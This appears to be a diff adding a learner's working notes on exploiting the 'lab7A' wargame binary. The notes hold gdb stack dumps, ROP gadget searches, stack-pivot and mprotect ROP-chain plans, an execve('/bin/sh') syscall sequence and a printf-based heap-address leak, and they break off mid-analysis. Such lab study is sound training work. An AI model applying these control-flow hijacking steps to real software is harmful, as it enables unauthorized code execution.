@@ -1009,3 +1009,1084 @@ Yup, it looks the way I exected it to look when while doing the print_msg call.
 
 Now, from this point, we need to figure out how to get a shell.
 
+Things that might become useful here:
+ECX contains the stack base (ECX: 0xbffff6cd, which is ESP+21:
+gdb-peda$ p 0xbffff6cd-0xbffff6ac
+$3 = 0x21
+
+We might want to leak it or move something to the stack to groom it for some other call (e.g. mprotect), if that's an option.
+I am just afraid anything we write here will be overwritten due to the intermediary calls.
+
+I need to find the full list of libc functions linked in.
+
+Not the best solution, but allows exploring:
+   0x80484d6 <group_number+101>:        mov    ecx,DWORD PTR [ebp-0x28]
+   0x80484d9 <group_number+104>:        mov    DWORD PTR [ebp+0x8],ebx
+   0x80484dc <group_number+107>:        cmp    eax,edi
+   0x80484de <group_number+109>:        jbe    0x8048539 <group_number+200>
+   0x80484e0 <group_number+111>:        dec    eax
+   0x80484e1 <group_number+112>:        mov    bl,BYTE PTR [eax]
+   0x80484e3 <group_number+114>:        dec    esi
+   0x80484e4 <group_number+115>:        lea    edx,[ecx-0x1]
+   0x80484e7 <group_number+118>:        mov    BYTE PTR [ecx-0x1],bl
+   0x80484ea <group_number+121>:        jne    0x8048535 <group_number+196>
+   0x80484ec <group_number+123>:        cmp    eax,edi
+   0x80484ee <group_number+125>:        jbe    0x8048535 <group_number+196>
+   0x80484f0 <group_number+127>:        mov    ecx,DWORD PTR [ebp-0x20]
+gdb-peda$ x/100i 0x08048000+0x400
+
+Need to find out where these symbols are stored and just print them out.
+objdump -t lab7A
+
+Possible approaches:
+1) intermittent ROP shell				(not sure what I would be trying to achieve, as the intermittent nature would fuck up our register grooming...)						
+2) making heap/stack/data executable	(mprotect)
+3) making code writable					(mprotect)
+4) loading libc							(dlopen, not available)
+
+gdb-peda$ p dl
+No symbol table is loaded.  Use the "file" command.
+gdb-peda$ p dlopen
+No symbol table is loaded.  Use the "file" command.
+gdb-peda$ dlsym
+Undefined command: "dlsym".  Try "help".
+
+Fuck, I don't think we can... But... mhm.
+
+We also have vdso segment executable (and ASLR-ed).
+
+How about execve (syscall):
+mov eax,11
+mov ebx,ptr_to_string
+mov ecx,0
+mov edx,0
+int 0x80
+
+OK, could be:
+mov eax,11
+mov ebx,ptr_to_string
+int 0x80
+
+Which means:
+
+OK, could be:
+mov eax,11
+mov ebx,(esp-0x8)
+int 0x80
+
+lab7A@warzone:/tmp$ objdump -S lab7A  > asm_source.txt
+lab7A@warzone:/tmp$
+
+Let's search for it :P
+
+Nah, no such gadget.
+
+5) Find a gadget that does mov esp, ebx or something like that and make the heap our stack :D This could actually work, but we don't have such a gadget for quite an obvious reason :P
+
+A gadget like:
+pop anything
+pop %esp
+ret 
+
+would be the thing. However, no direct pop esp anywhere. Fuck.
+How about other operations where ESP is the target, not the source?
+
+
+lab7A@warzone:/tmp$ grep '%esp' asm_source.txt  | grep -v '(' | grep -v ')' | grep -v sub|grep -v add | grep -E 'esp$'
+ 8048d2f:       83 e4 f0                and    $0xfffffff0,%esp
+ 8048d33:       54                      push   %esp
+ 804956c:       83 e4 f0                and    $0xfffffff0,%esp
+ 80a5870:       54                      push   %esp
+ 80a58ce:       89 fc                   mov    %edi,%esp
+ 80a58e7:       89 dc                   mov    %ebx,%esp
+ 80a58ff:       54                      push   %esp
+ 80a695d:       89 cc                   mov    %ecx,%esp
+ 80bcf86:       89 cc                   mov    %ecx,%esp
+ 80bcff5:       89 ec                   mov    %ebp,%esp
+ 80bd036:       89 cc                   mov    %ecx,%esp
+ 80bd0f3:       89 cc                   mov    %ecx,%esp
+ 80bd17c:       89 ec                   mov    %ebp,%esp
+ 80bd1bd:       89 cc                   mov    %ecx,%esp
+
+These appear to be good candidates:
+ 80a58ce:       89 fc                   mov    %edi,%esp
+ 80a58e7:       89 dc                   mov    %ebx,%esp
+ 80a695d:       89 cc                   mov    %ecx,%esp
+ 80bcf86:       89 cc                   mov    %ecx,%esp
+ 80bcff5:       89 ec                   mov    %ebp,%esp
+ 80bd036:       89 cc                   mov    %ecx,%esp
+ 80bd0f3:       89 cc                   mov    %ecx,%esp
+ 80bd17c:       89 ec                   mov    %ebp,%esp
+ 80bd1bd:       89 cc                   mov    %ecx,%esp
+
+Fuck. No %edx, %esp (EDX is the only thingy containing what we need).
+
+Let's examine them all anyway to get the better picture.
+
+   0x80bd17c <_Unwind_Resume_or_Rethrow+124>:   mov    esp,ebp
+   0x80bd17e <_Unwind_Resume_or_Rethrow+126>:   pop    ebp
+   0x80bd17f <_Unwind_Resume_or_Rethrow+127>:   ret
+
+Hehe, this is a nice idea but I don't think any of these gadgets allows me to do this without crashing.
+
+Either way, this made me realize that operations on esp are equally dangerous as operations on saved RET, as ESP allows us to effectively hijack the entire fucking stack ;)
+
+Eitherway, it appears I was wrong when looking at the stack and that in fact those alignments are almost perfectly aligned for calling mprotect(). We just need to try to control the 0 (length) argument. 0xa should be fine as it contains 7 (READ WRITE EXEC), hopefully it won't result in EINVAL. The only concern is whether mprotect(heap_ptr, 0, 0xa) will make the entire heap executable or throw an error. If the latter is the case, we might want to see if we can control that 0 on the stack somehow.
+
+gdb-peda$ x/100 $esp
+0xbffff6b0:     0x080f0ae0      0x00000000      <-- this, it has to be stored here before the print index is even called
+
+OK, fuck it, little trick:
+
+gdb-peda$ set $eax=0x806f340
+gdb-peda$ info registers
+eax            0x806f340        0x806f340
+ecx            0xbffff6cd       0xbffff6cd
+edx            0x80f0ae0        0x80f0ae0
+ebx            0x80481a8        0x80481a8
+esp            0xbffff6b0       0xbffff6b0
+ebp            0xbffff6f8       0xbffff6f8
+esi            0x0      0x0
+edi            0x80ebfbc        0x80ebfbc
+eip            0x804951f        0x804951f <print_index+158>
+eflags         0x202    [ IF ]
+cs             0x73     0x73
+ss             0x7b     0x7b
+ds             0x7b     0x7b
+es             0x7b     0x7b
+fs             0x0      0x0
+gs             0x33     0x33
+gdb-peda$ p $eax
+$6 = 0x806f340
+gdb-peda$ p mprotect
+$7 = {<text variable, no debug info>} 0x806f340 <mprotect>
+
+OK, step!
+
+gdb-peda$ s
+
+Now, breakpoint at ret, so we'll have a breakpoint right after mprotect() call is done:
+
+0x0806f340 in mprotect ()
+gdb-peda$ x/100wx $esp
+0xbffff6ac:     0x08049521      0x080f0ae0      0x00000000      0x0000000a
+0xbffff6bc:     0x080ec240      0x080ec240      0x00000029      0x00000001
+0xbffff6cc:     0x08000a31      0x080ec240      0x0000000a      0x00000029
+0xbffff6dc:     0x08050280      0x080ec240      0x080c035e      0x00000004
+0xbffff6ec:     0xf3b9a000      0x00000000      0x080ebfbc      0xbffff728
+0xbffff6fc:     0x0804967e      0x080c0370      0x00000000      0x00000002
+0xbffff70c:     0x00000000      0x080ec014      0xbffff7b4      0x00000004
+0xbffff71c:     0xf3b9a000      0x00000000      0x080ebfbc      0x08049e70
+0xbffff72c:     0x080498ba      0x00000001      0xbffff7b4      0xbffff7bc
+0xbffff73c:     0x00000000      0x00000000      0x080481a8      0x00000000
+0xbffff74c:     0x080ebfbc      0x08049e70      0x89297dfc      0x7ff7ec93
+0xbffff75c:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff76c:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff77c:     0x00000000      0x00000001      0x00000000      0x00000000
+0xbffff78c:     0x08048d4b      0x08049569      0x00000001      0xbffff7b4
+0xbffff79c:     0x08049dd0      0x08049e70      0x00000000      0xbffff7ac
+0xbffff7ac:     0x00000000      0x00000001      0xbffff8d3      0x00000000
+0xbffff7bc:     0xbffff8de      0xbffff8f0      0xbffff900      0xbffff915
+0xbffff7cc:     0xbffff936      0xbffff949      0xbffff954      0xbffffe75
+0xbffff7dc:     0xbffffe86      0xbffffe92      0xbffffef0      0xbfffff05
+0xbffff7ec:     0xbfffff14      0xbfffff1d      0xbfffff2e      0xbfffff37
+0xbffff7fc:     0xbfffff48      0xbfffff50      0xbfffff5e      0xbfffff90
+0xbffff80c:     0xbfffffb0      0xbfffffcf      0x00000000      0x00000020
+0xbffff81c:     0xb7ffdd3c      0x00000021      0xb7ffd000      0x00000010
+0xbffff82c:     0x078bfbff      0x00000006      0x00001000      0x00000011
+gdb-peda$ break *0x08049521
+
+
+gdb-peda$ c
+Continuing.
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffffff
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0x80ef840 (0x080ef840)
+EDX: 0xa ('\n')
+ESI: 0x0
+EDI: 0x80ebfbc --> 0x8069190 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6f8 --> 0xbffff728 --> 0x8049e70 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff6b0 --> 0x80f0ae0 --> 0x806f340 (<mprotect>:        push   ebx)
+EIP: 0x8049521 (<print_index+160>:      mov    eax,0x0)
+EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049515 <print_index+148>: mov    edx,DWORD PTR [edx*4+0x80edf60]
+   0x804951c <print_index+155>: mov    DWORD PTR [esp],edx
+   0x804951f <print_index+158>: call   eax
+=> 0x8049521 <print_index+160>: mov    eax,0x0
+   0x8049526 <print_index+165>: mov    ecx,DWORD PTR [ebp-0xc]
+   0x8049529 <print_index+168>: xor    ecx,DWORD PTR gs:0x14
+   0x8049530 <print_index+175>: je     0x8049537 <print_index+182>
+   0x8049532 <print_index+177>: call   0x8070570 <__stack_chk_fail>
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6b0 --> 0x80f0ae0 --> 0x806f340 (<mprotect>:       push   ebx)
+0004| 0xbffff6b4 --> 0x0
+0008| 0xbffff6b8 --> 0xa ('\n')
+0012| 0xbffff6bc --> 0x80ec240 --> 0xfbad2887
+0016| 0xbffff6c0 --> 0x80ec240 --> 0xfbad2887
+0020| 0xbffff6c4 --> 0x29 (')')
+0024| 0xbffff6c8 --> 0x1
+0028| 0xbffff6cc --> 0x8000a31
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 3, 0x08049521 in print_index ()
+
+OK, we're out...
+
+/usr/include/asm-generic/errno-base.h contains the error codes. EINVAL is 22.
+
+Why 0xffffffff then? Anyway... We have to control that 0.
+
+Breakpoint 3, 0x08049521 in print_index ()
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0x08048000 0x080eb000 r-xp      /tmp/lab7A
+0x080eb000 0x080ed000 rw-p      /tmp/lab7A
+0x080ed000 0x08111000 rw-p      [heap]
+0xb7ffc000 0xb7ffd000 rw-p      mapped
+0xb7ffd000 0xb7ffe000 r-xp      [vdso]
+0xb7ffe000 0xb8000000 r--p      [vvar]
+0xbffdf000 0xc0000000 rw-p      [stack]
+
+Heap is still rw. Ok, I am not surprised.
+
+OK, stack in print_menu:
+
+Breakpoint 1, 0x0804953f in print_menu ()
+gdb-peda$ x/100 $esp
+0xbffff6d0:     0x080ec240      0x00000000      0x00000000      0x0804f4f6
+0xbffff6e0:     0x5c97498b      0x080ec020      0xbffff728      0x080481a8
+0xbffff6f0:     0x00000000      0x080ebfbc      0xbffff728      0x080495c4
+0xbffff700:     0x080ec240      0x00000000      0x00000002      0x00000000
+0xbffff710:     0x080ec014      0xbffff7b4      0x00000000      0x17c41f00
+0xbffff720:     0x00000000      0x080ebfbc      0x08049e70      0x080498ba
+0xbffff730:     0x00000001      0xbffff7b4      0xbffff7bc      0x00000000
+0xbffff740:     0x00000000      0x080481a8      0x00000000      0x080ebfbc
+
+FUCK. This 0 comes from the     i = strtoul(numbuf, NULL, 10); call.
+We can't control it. FUCK.
+
+Perhaps we could jump to the call right away (inside the print_index).
+
+
+Eh. At least we know we have the argument alignment right for mprotect.
+
+========================== GETTING BACK AFTER A BREAK WITH SOME NEW INSIGHTS !!!! =========================
+
+1) OUR BINARY HAS DIFFERENT OFFSETS, WE NEED TO STOP WORKING ON IT!
+Reading corbenik's exploit made me realize he did find a proper stack pivoting (yes, this is how it's called, it turns out I did not invent anything new - obviously - when I thought of setting esp to point at the heap :D) at 0x080bd486:
+
+lab7A@warzone:/tmp$ gdb /levels/lab07/lab7A
+Reading symbols from /levels/lab07/lab7A...(no debugging symbols found)...done.
+gdb-peda$ x/10i 0x080bd486
+   0x80bd486 <_Unwind_RaiseException+358>:      mov    esp,ecx
+   0x80bd488 <_Unwind_RaiseException+360>:      ret
+   0x80bd489:   lea    esi,[esi+eiz*1+0x0]
+   0x80bd490 <_Unwind_ForcedUnwind>:    push   ebp
+   0x80bd491 <_Unwind_ForcedUnwind+1>:  mov    ebp,esp
+   0x80bd493 <_Unwind_ForcedUnwind+3>:  push   edi
+   0x80bd494 <_Unwind_ForcedUnwind+4>:  push   esi
+   0x80bd495 <_Unwind_ForcedUnwind+5>:  push   ebx
+   0x80bd496 <_Unwind_ForcedUnwind+6>:  push   edx
+   0x80bd497 <_Unwind_ForcedUnwind+7>:  push   eax
+
+For some reason, my locally compiled binary differs:
+
+gdb-peda$ x/10i 0x080bd480
+   0x80bd480 <size_of_encoded_value+32>:        cli
+   0x80bd481 <size_of_encoded_value+33>:        add    esi,DWORD PTR [eax+ebx*1-0x80]
+   0x80bd485 <size_of_encoded_value+37>:        cli
+   0x80bd486 <size_of_encoded_value+38>:        add    al,0xb8
+   0x80bd488 <size_of_encoded_value+40>:        or     BYTE PTR [eax],al
+   0x80bd48a <size_of_encoded_value+42>:        add    BYTE PTR [eax],al
+   0x80bd48c <size_of_encoded_value+44>:        jne    0x80bd4a8 <size_of_encoded_value+72>
+   0x80bd48e <size_of_encoded_value+46>:        add    esp,0x8
+   0x80bd491 <size_of_encoded_value+49>:        pop    ebx
+   0x80bd492 <size_of_encoded_value+50>:        ret
+
+Even though I have only changed one number (60 to 0) in enable timeout... Either way, this made me realize I have to work on the original binary.
+The problem is, however, the timeout. We can either:
+1) patch the binary itself, without affecting any offets, of course
+2) call alarm(0) from gdb at the first breakpoint, turning that alarm off
+
+Breakpoint 1, 0x0804953f in print_menu ()
+gdb-peda$ call alarm(0)
+[----------------------------------registers-----------------------------------]
+EAX: 0x38 ('8')
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0x0
+EDX: 0x80481a8 (<_init>:        push   ebx)
+ESI: 0x0
+EDI: 0x80ecfbc --> 0x8069190 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff68c --> 0xbffff6af --> 0xfff7a4cc
+ESP: 0xbffff690 --> 0x0
+EIP: 0xbffff6af --> 0xfff7a4cc
+EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0xbffff6a9:  add    BYTE PTR [eax],al
+   0xbffff6ab:  add    BYTE PTR [ebx],al
+   0xbffff6ad:  add    BYTE PTR [eax],al
+=> 0xbffff6af:  int3
+   0xbffff6b0:  movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
+   0xbffff6b1:  idiv   edi
+   0xbffff6b3:  mov    edi,0xbffff7ac
+   0xbffff6b8:  inc    eax
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff690 --> 0x0
+0004| 0xbffff694 --> 0x80ed240 --> 0xfbad2087
+0008| 0xbffff698 --> 0x2
+0012| 0xbffff69c --> 0x8052bb0 (<_IO_new_file_setbuf+32>:       test   eax,eax)
+0016| 0xbffff6a0 --> 0x80ed240 --> 0xfbad2087
+0020| 0xbffff6a4 --> 0x0
+0024| 0xbffff6a8 --> 0x0
+0028| 0xbffff6ac --> 0xcc000003
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+$1 = 0x38
+gdb-peda$ c
+
+
+Script this up:
+lab7A@warzone:/tmp$ cat commands.txt
+break print_menu
+run
+call alarm(0)
+continue
+lab7A@warzone:/tmp$ gdb -x commands.txt /levels/lab07/lab7A
+
+
+2) OUR METHOD OF LOOKING FOR GADGETS (objdump -S lab7A | grep) is insufficient. Luckily I came across this read https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/emerging-stack-pivoting-exploits-bypass-common-security/, which reminded me about the fact that depending on the offset we start interpreting from, we can achieve different opcodes (some anti-disassembly techniques rely on this fact as well).
+
+Hopefully ropeme takes advantage of this. Let's use it. Fuck, it crashes. Oh, I was using the wrong command. What an idiot.
+
+ROPeMe> generate ./lab7A
+Generating gadgets for ./lab7A with backward depth=3
+It may take few minutes depends on the depth and file size...
+Processing code block 1/1
+Generated 7617 gadgets
+Dumping asm gadgets to file: lab7A.ggt ...
+OK
+ROPeMe> load lab7A.ggt
+Loading asm gadgets from file: lab7A.ggt ...
+Loaded 7617 gadgets
+ELF base address: 0x8048000
+OK
+
+ROPeMe> search mov esp ?
+Searching for ROP gadget:  mov esp ? with constraints: []
+0x806a4d1L: mov esp 0x5ff801c0 ;;
+0x80bd486L: mov esp ecx ;;
+0x80bd536L: mov esp ecx ;;
+0x80bd5f3L: mov esp ecx ;;
+
+ROPeMe> search pop esp
+Searching for ROP gadget:  pop esp with constraints: []
+0x80bd1d6L: pop esp ;;
+0x80e4906L: pop esp ;;
+
+Ok, these MIGHT be useful, maybe there's another pop above them, let's examine them.
+What we really need to exploit from the message->print_msg pointer call is something like:
+mov esp edx or its equivalent, like
+mov ecx edx; mov esp ecx;
+
+pop esp itself is not a help since we have a code segment address (saved ret) on top at the time of execution hijack.
+
+  0x80bd1d3 <_Unwind_GetRegionStart+3>:        add    al,0x8b
+   0x80bd1d5 <_Unwind_GetRegionStart+5>:        inc    eax
+   0x80bd1d6 <_Unwind_GetRegionStart+6>:        pop    esp
+   0x80bd1d7 <_Unwind_GetRegionStart+7>:        ret
+
+Fuck. Both these two pop esp gadgets only exist when pointed at that offset. And they are not preceded with anything moving edx to ecx.
+Fuck.
+
+when print message is called:
+gdb-peda$ x/100 $esp
+0xbffff680:     0xbffff6cc      0x00000000      0x0000000a      0x00000000
+0xbffff690:     0x080edee0      0x080c0670      0xbffff6b4      0x080481a8
+0xbffff6a0:     0x00000000      0x080ecfbc      0xbffff6f8      0x08049521
+0xbffff6b0:     0x080f19d0      0x00000000      0x0000000a      0x080ed240
+0xbffff6c0:     0x080ed240      0x00000029      0x00000000      0x08000a30
+0xbffff6d0:     0x080ed240      0x0000000a      0x00000029      0x08050280
+0xbffff6e0:     0x080ed240      0x080c085e      0x00000004      0xe931fd00
+0xbffff6f0:     0x00000000      0x080ecfbc      0xbffff728      0x0804967e
+
+
+when crash is encountered
+gdb-peda$ x/100 $esp
+0xbffff6ac:     0x08049521      0x080f1ae0      0x00000000      0x0000000a
+0xbffff6bc:     0x080ed240      0x080ed240      0x00000029      0x00000001
+0xbffff6cc:     0x08000a31      0x080ed240      0x0000000a      0x00000029
+0xbffff6dc:     0x08050280      0x080ed240      0x080c085e      0x00000004
+0xbffff6ec:     0xe931fd00      0x00000000      0x080ecfbc      0xbffff728
+
+Why the difference?
+
+gdb-peda$ disas print_message
+Dump of assembler code for function print_message:
+   0x08048fd3 <+0>:     push   ebp
+   0x08048fd4 <+1>:     mov    ebp,esp
+   0x08048fd6 <+3>:     sub    esp,0x28 <-- I guess this is why
+=> 0x08048fd9 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
+   0x08048fdc <+9>:     mov    DWORD PTR [ebp-0x1c],eax
+
+gdb-peda$ x/100 $esp
+0xbffff680:     0xbffff6cc      0x00000000      0x0000000a      0x00000000
+0xbffff690:     0x080edee0      0x080c0670      0xbffff6b4      0x080481a8
+0xbffff6a0:     0x00000000      0x080ecfbc      0xbffff6f8      0x08049521
+0xbffff6b0:     0x080f19d0      0x00000000      0x0000000a      0x080ed240
+0xbffff6c0:     0x080ed240      0x00000029      0x00000000      0x08000a30
+0xbffff6d0:     0x080ed240      0x0000000a      0x00000029      0x08050280
+0xbffff6e0:     0x080ed240      0x080c085e      0x00000004      0xe931fd00
+
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x5a5a5a5a ('ZZZZ')
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0xbffff6cd --> 0x4008000a
+EDX: 0x80f1ae0 ("ZZZZ\nÓ\032.8\323}\343H\320}\266\374_V\215\177uC\362\250\360\035%\340\374Z\371R\357\"\341δm:\271&\035*\230!K6\330\332\016A,\216f\277\352vN\006\"M\024Q\202\020hd\317\t&\354W\216iMQ\255")
+ESI: 0x0
+EDI: 0x80ecfbc --> 0x8069190 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6f8 --> 0xbffff728 --> 0x8049e70 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff6ac --> 0x8049521 (<print_index+160>:       mov    eax,0x0)
+EIP: 0x5a5a5a5a ('ZZZZ')
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x5a5a5a5a
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6ac --> 0x8049521 (<print_index+160>:      mov    eax,0x0)
+0004| 0xbffff6b0 --> 0x80f1ae0 ("ZZZZ\nÓ\032.8\323}\343H\320}\266\374_V\215\177uC\362\250\360\035%\340\374Z\371R\357\"\341δm:\271&\035*\230!K6\330\332\016A,\216f\277\352vN\006\"M\024Q\202\020hd\317\t&\354W\216iMQ\255")
+0008| 0xbffff6b4 --> 0x0
+0012| 0xbffff6b8 --> 0xa ('\n')
+0016| 0xbffff6bc --> 0x80ed240 --> 0xfbad2887
+0020| 0xbffff6c0 --> 0x80ed240 --> 0xfbad2887
+0024| 0xbffff6c4 --> 0x29 (')')
+0028| 0xbffff6c8 --> 0x1
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x5a5a5a5a in ?? ()
+gdb-peda$ x/100 $esp
+0xbffff6ac:     0x08049521      0x080f1ae0      0x00000000      0x0000000a
+0xbffff6bc:     0x080ed240      0x080ed240      0x00000029      0x00000001
+0xbffff6cc:     0x08000a31      0x080ed240      0x0000000a      0x00000029 <-- ECX points here, 0xbffff6cd... 
+0xbffff6dc:     0x08050280      0x080ed240      0x080c085e      0x00000004 This area is filled by the local variables of the print_index
+0xbffff6ec:     0xe931fd00      0x00000000      0x080ecfbc      0xbffff728 function. Hence, we can groom this with our new preferred 
+0xbffff6fc:     0x0804967e      0x080c0870      0x00000000      0x00000002 heap address. Then, we call our stack-pivoting instuction
+0xbffff70c:     0x00000000      0x080ed014      0xbffff7b4      0x00000004 to star ROPchain execution. Then we do the second part of 
+0xbffff71c:     0xe931fd00      0x00000000      0x080ecfbc      0x08049e70 stack pivoting, moving the execution to heap.
+0xbffff72c:     0x080498ba      0x00000001      0xbffff7b4      0xbffff7bc
+0xbffff73c:     0x00000000      0x00000000      0x080481a8      0x00000000
+0xbffff74c:     0x080ecfbc      0x08049e70      0xbf3d9c9f      0x49e30df0
+0xbffff75c:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff76c:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff77c:     0x00000000      0x00000001      0x00000000      0x00000000
+
+Yeah, ECX points at something we control here:
+
+
+gdb-peda$ c
+Continuing.
+-Input message index to print: 0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[----------------------------------registers-----------------------------------]
+EAX: 0x8048fd3 (<print_message>:        push   ebp)
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0xbffff6cd ('A' <repeats 30 times>)
+EDX: 0x80f19d0 --> 0x8048fd3 (<print_message>:  push   ebp)
+ESI: 0x0
+EDI: 0x80ecfbc --> 0x8069190 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6a8 --> 0xbffff6f8 --> 0xbffff728 --> 0x8049e70 (<__libc_csu_fini>: push   ebx)
+ESP: 0xbffff680 --> 0xbffff6cc ("0", 'A' <repeats 30 times>)
+EIP: 0x8048fd9 (<print_message+6>:      mov    eax,DWORD PTR [ebp+0x8])
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048fd3 <print_message>:   push   ebp
+   0x8048fd4 <print_message+1>: mov    ebp,esp
+   0x8048fd6 <print_message+3>: sub    esp,0x28
+=> 0x8048fd9 <print_message+6>: mov    eax,DWORD PTR [ebp+0x8]
+   0x8048fdc <print_message+9>: mov    DWORD PTR [ebp-0x1c],eax
+   0x8048fdf <print_message+12>:        mov    eax,gs:0x14
+   0x8048fe5 <print_message+18>:        mov    DWORD PTR [ebp-0xc],eax
+   0x8048fe8 <print_message+21>:        xor    eax,eax
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff680 --> 0xbffff6cc ("0", 'A' <repeats 30 times>)
+0004| 0xbffff684 --> 0x0
+0008| 0xbffff688 --> 0xa ('\n')
+0012| 0xbffff68c --> 0x0
+0016| 0xbffff690 --> 0x80edee0 --> 0x80c6080 --> 0x80d3e50 --> 0x4d470043 ('C')
+0020| 0xbffff694 --> 0x80c0670 ("-Input message index to print: ")
+0024| 0xbffff698 --> 0xbffff6b4 --> 0x0
+0028| 0xbffff69c --> 0x80481a8 (<_init>:        push   ebx)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x08048fd9 in print_message ()
+gdb-peda$ x/100wx $esp
+0xbffff680:     0xbffff6cc      0x00000000      0x0000000a      0x00000000
+0xbffff690:     0x080edee0      0x080c0670      0xbffff6b4      0x080481a8
+0xbffff6a0:     0x00000000      0x080ecfbc      0xbffff6f8      0x08049521
+0xbffff6b0:     0x080f19d0      0x00000000      0x0000000a      0x080ed240
+0xbffff6c0:     0x080ed240      0x00000029      0x00000000      0x41414130
+0xbffff6d0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6e0:     0x41414141      0x41414141      0x00414141      0x32b8c100
+0xbffff6f0:     0x00000000      0x080ecfbc      0xbffff728      0x0804967e
+0xbffff700:     0x080c0870      0x00000000      0x00000002      0x00000000
+0xbffff710:     0x080ed014      0xbffff7b4      0x00000004      0x32b8c100
+
+
+We have 30 bytes on the stack to stick our first-stage ROP-chain on the print_message stack, which we have to deliver in the parent print_index function call along with the input index of the message to print (1):
+
+Aa0A
+a1Aa
+2Aa3
+Aa4A
+a5Aa
+6Aa7
+Aa8A
+a9
+
+So, we from here we can either pivot to stack to heap (0x080f19d0) and then play with XOR to have our ROP shell over there,
+or we can mprotect() to make it executable, push its address, pop to esp and then ret - still having to deal with the ROP.
+We assume we'll have the heap address leaked, but eitherway, let's focus on the address of the second message (we'll calculate it after the leak):
+0xbffff6b0:     0x080f19d
+
+gdb-peda$ x/100wx 0x080f19d0
+0x80f19d0:      0x08048fd3      0x4e6d0d45      0x0c1adcfa      0x63649181
+0x80f19e0:      0x5bad21c2      0x28329189      0x791de8c3      0x5ffe0411
+0x80f19f0:      0x6c0d2a1e      0x1d7c5008      0x1b79c188      0x321fe4da
+0x80f1a00:      0x230f7b0c      0x31891841      0x1abf1b24      0x4c252612
+0x80f1a10:      0x2d960919      0x1d3b52df      0x2e58b58e      0x0d86288b
+0x80f1a20:      0x4fc1ac72      0x428afcc7      0x643fd37f      0x0b1773b5
+0x80f1a30:      0x60a7fb9b      0x1afa8937      0x3f99fa16      0x210ba602
+0x80f1a40:      0x3657bec3      0x64bda0e7      0x07762db1      0x2720bab6
+0x80f1a50:      0x332aae2d      0x0f2c4c04      0x4d5b9dbb      0x2225d0c0
+0x80f1a60:      0x1aec6083      0x6973d0c8      0x385ca982      0x1ebf4550
+0x80f1a70:      0x2d4c6b5f      0x5c3d1149      0x5a3880c9      0x735ea59b
+0x80f1a80:      0x624e3a4d      0x70c85900      0x5bfe5a65      0x0d646753
+0x80f1a90:      0x6cd74858      0x5c7a139e      0x6f19f4cf      0x4cc769ca
+0x80f1aa0:      0x0e80ed33      0x03cbbd86      0x257e923e      0x4a5632f4
+0x80f1ab0:      0x21e6bada      0x5bbbc876      0x7ed8bb57      0x604ae743
+0x80f1ac0:      0x7716ff82      0x25fce1a6      0x46376cf0      0x6661fbf7
+
+# ROPCHAIN 1
+How about the following ROP chain (mprotect variant):
+mprotect_addr
+pop3retaddr
+0x080f19d+4
+0x80	(128, for example we don't need more)
+0x7		(READ_WRITE_EXEC)
+0x080f19d+4 (where to ret)
+
+while the entire XOR-padded thingy will contain our shellcode (we'll have to XOR it with the XOR pad before sending out, so after XOR-ing it gets back to its desired state), we'll have to do the same with a ROP shell as well.
+
+# ROPCHAIN 2
+A second idea is to pivot stack again, this time to the heap.
+
+We could achieve this by:
+pop ecx; ret addr
+0x080f19d+4
+mov esp, ecx; ret addr
+/bin/sh execve int 0x80 ropchain here
+
+
+## LEAKING THE HEAP ADDRESS
+As I had already peeked into corb3nik's solution when I got stuck on stack pivoting, I saw his exploit was in fact leaking the heap address, so I decided to do this as well, regardless to whether it was actually needed - to make the exploit more reliable and to learn how the leak was done (very neat, I have to admit :D).
+
+So, we can overwrite the print_message pointer with printf()'s address (which is fixed in this binary, so no previous leaks required), however when the printf is called insteda of print_message, it receives the exactly same stack:
+gdb-peda$ x/100wx $esp
+0xbffff62c:     0x08049521      0x080f1ae8      0x00000000      0x0000000a
+0xbffff63c:     0x080ed240      0x080ed240      0x00000029      0x00000001
+0xbffff64c:     0x08000a31      0x080ed240      0x0000000a      0x00000029
+
+whereas 0x08049521 (0xbffff62c) is the saved RET (back to print_index() body after the "call eax" (message[i]->print_message) instruction), while 0x080f1ae8 at the time of the snapshot above (0xbffff62c+0x4) - the pointer to the message structure we are about to print - is the only argument passed.
+
